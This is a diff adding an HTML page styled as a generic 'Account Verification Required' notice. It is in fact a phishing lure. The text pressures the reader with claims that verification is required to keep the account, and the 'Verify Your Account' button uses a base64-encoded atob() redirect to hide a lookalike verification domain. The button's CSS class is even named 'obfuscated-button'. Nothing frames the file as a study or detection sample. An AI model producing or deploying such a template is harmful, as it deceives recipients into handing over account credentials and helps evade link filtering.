@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verification</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', 'Arial', sans-serif; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 20px auto; background: #fff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .header { background: linear-gradient(135deg, #1976d2 0%, #1565c0 100%); color: #fff; padding: 35px 20px; text-align: center; }
+        .header h2 { font-size: 26px; margin: 0; font-weight: 600; }
+        .content { padding: 35px 25px; color: #333; line-height: 1.7; }
+        .content p { margin: 14px 0; font-size: 14px; color: #555; }
+        .divider { height: 1px; background: linear-gradient(90deg, transparent, #ddd, transparent); margin: 25px 0; }
+        .obfuscated-button { background: linear-gradient(135deg, #1976d2 0%, #1565c0 100%); color: #fff; padding: 14px 35px; text-decoration: none; border-radius: 6px; font-size: 15px; font-weight: 600; margin: 20px 0; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(25, 118, 210, 0.3); border: none; cursor: pointer; display: inline-block; }
+        .obfuscated-button:hover { background: linear-gradient(135deg, #1565c0 0%, #1043a8 100%); box-shadow: 0 6px 15px rgba(25, 118, 210, 0.4); transform: translateY(-2px); }
+        .button-container { text-align: center; margin: 25px 0; }
+        .footer { padding: 15px 20px; background: #fafafa; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #888; }
+        .info-box { background: #f0f8ff; border-left: 4px solid #1976d2; padding: 15px; margin: 15px 0; border-radius: 4px; font-size: 13px; color: #0d47a1; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>Account Verification Required</h2>
+        </div>
+        <div class="content">
+            <p>Thank you for using our service.</p>
+            <p>For your account security, we need you to verify your information through our secure gateway.</p>
+            <div class="divider"></div>
+            <div class="info-box">
+                <strong>Important:</strong> Verification is required to continue using your account.
+            </div>
+            <p>Please follow these steps to complete verification.</p>
+            <div class="button-container">
+                <button class="obfuscated-button" onclick="window.location.href=atob('aHR0cHM6Ly9zZWN1cmUtdmVyaWZpY2F0aW9uLmNvbS9hY2NvdW50');">
+                    Verify Your Account
+                </button>
+            </div>
+            <div class="divider"></div>
+            <p>If you have any questions, please contact our support team.</p>
+        </div>
+        <div class="footer"><p>&copy; 2025 Security System. All rights reserved.</p></div>
+    </div>
+</body>
+</html>
+
